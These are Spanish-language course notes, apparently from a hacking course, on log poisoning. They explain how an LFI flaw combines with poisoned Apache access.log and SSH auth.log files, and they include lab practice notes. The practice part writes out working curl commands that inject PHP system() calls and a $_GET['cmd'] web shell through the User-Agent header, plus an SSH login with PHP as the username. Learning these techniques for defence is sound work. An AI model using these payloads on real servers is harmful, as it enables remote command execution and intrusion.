------

El **Log Poisoning** es una técnica de ataque en la que un atacante **manipula** los **archivos de registro** (**logs**) de una aplicación web para lograr un resultado malintencionado. Esta técnica puede ser utilizada en conjunto con una vulnerabilidad **LFI** para lograr una **ejecución remota de comandos** en el servidor.

Como ejemplos para esta clase, trataremos de envenenar los recursos ‘**auth.log**‘ de **SSH** y ‘**access.log**‘ de **Apache**, comenzando mediante la explotación de una vulnerabilidad LFI primeramente para acceder a estos archivos de registro. Una vez hayamos logrado acceder a estos archivos, veremos cómo manipularlos para incluir código malicioso.

En el caso de los logs de SSH, el atacante puede inyectar código PHP en el campo de **usuario** durante el proceso de autenticación. Esto permite que el código se registre en el log ‘**auth.log**‘ de SSH y sea interpretado en el momento en el que el archivo de registro sea leído. De esta manera, el atacante puede lograr una ejecución remota de comandos en el servidor.

En el caso del archivo ‘**access.log**‘ de Apache, el atacante puede inyectar código PHP en el campo **User-Agent** de una solicitud HTTP. Este código malicioso se registra en el archivo de registro ‘access.log’ de Apache y se ejecuta cuando el archivo de registro es leído. De esta manera, el atacante también puede lograr una ejecución remota de comandos en el servidor.

Cabe destacar que en algunos sistemas, el archivo ‘**auth.log**‘ no es utilizado para registrar los eventos de autenticación de SSH. En su lugar, los eventos de autenticación pueden ser registrados en archivos de registro con diferentes nombres, como ‘**btmp**‘.

Por ejemplo, en sistemas basados en Debian y Ubuntu, los eventos de autenticación de SSH se registran en el archivo ‘auth.log’. Sin embargo, en sistemas basados en Red Hat y CentOS, los eventos de autenticación de SSH se registran en el archivo ‘btmp’. Aunque a veces pueden haber excepciones.

Para prevenir el Log Poisoning, es importante que los desarrolladores limiten el acceso a los archivos de registro y aseguren que estos archivos se almacenen en un lugar seguro. Además, es importante que se valide adecuadamente la entrada del usuario y se filtre cualquier intento de entrada maliciosa antes de registrarla en los archivos de registro.


## Notas de la practica

Se creo una maquina donde tenemos un [[Local File Inclusion (LFI)]] muy básico pero que nos va a servir para comprender el concepto:

![[Pasted image 20250825170217.png]]

Como podemos observar ya tenemos el [[Local File Inclusion (LFI)]] y el objetivo es ver si nosotros podemos ver los logs del servicio en la ruta `/var/log/apache2/access.log` el cual almacena todas las petición que se reciben:

![[Pasted image 20250825170516.png]]

Sin importar el código de estado siempre se almacenaran aquí, algo a tener en cuenta es que los usuarios pertenecientes al grupo `adm` pueden mirar logs.

En este punto vamos a ver si logramos que listar esto desde la web:
![[Pasted image 20250825170731.png]]

como podemos observar si podemos ver los logs, en este punto lo que vamos a hacer es primero comprender que lo de `Mozilla/5.0....` es el user agent del dispositivo que envía las peticiones, nosotros este campo al momento de hacer una consulta lo podemos cambiar de la siguiente menera:
```bash
curl -s -X GET "http:/192.168.1.70/progando" -H "User-Agent: PROBANDO"
```

![[Pasted image 20250825171038.png]]

podemos ver que el User-Agent cambio y ya esto es suficiente para en este caso inyectar código php con el objetivo que se interprete:
```bash
curl -s -X GET "http:/192.168.1.70/progando" -H "User-Agent: <?php system('whoami'); ?>"
```

![[Pasted image 20250825171215.png]]

vemos que efectivamente logramos ejecutar el comando.

Ahora si queremos saber si la función system esta activa podemos hacer:
```bash
curl -s -X GET "http:/192.168.1.70/progando" -H "User-Agent: <?php phpinfo(); ?>"
```

![[Pasted image 20250825171414.png]]


el propósito de esto es ver que funciones están deshabilitadas en el campo de `disable_functions` si no vemos nada pues podemos usar cualquier función y podemos seguir con el ataque.

```bash
curl -s -X GET "http:/192.168.1.70/progando" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
```

![[Pasted image 20250825171943.png]]

Ahora otros logs de los que se pueden abusar es SSH por lo que puede estar en dos rutas o en `/var/log/auth.log` pero también puede estar en `/var/log/btm` por lo que si tratamos de ver alguno de ellos veremos las conexión del servicio:

![[Pasted image 20250825172226.png]]

Si nos fijamos el input que controlamos y esta en el log es el usuario por lo que será en este donde intentemos la inyección.
Entonces lo que vamos a hacer seria lo siguiente:
```bash
ssh '<?php system("whoami"); ?>'@localhost
```

y si revisamos los logs desde la web podremos ver como se ejecuta el comando:

`vulneravilidad ssh parcheada`.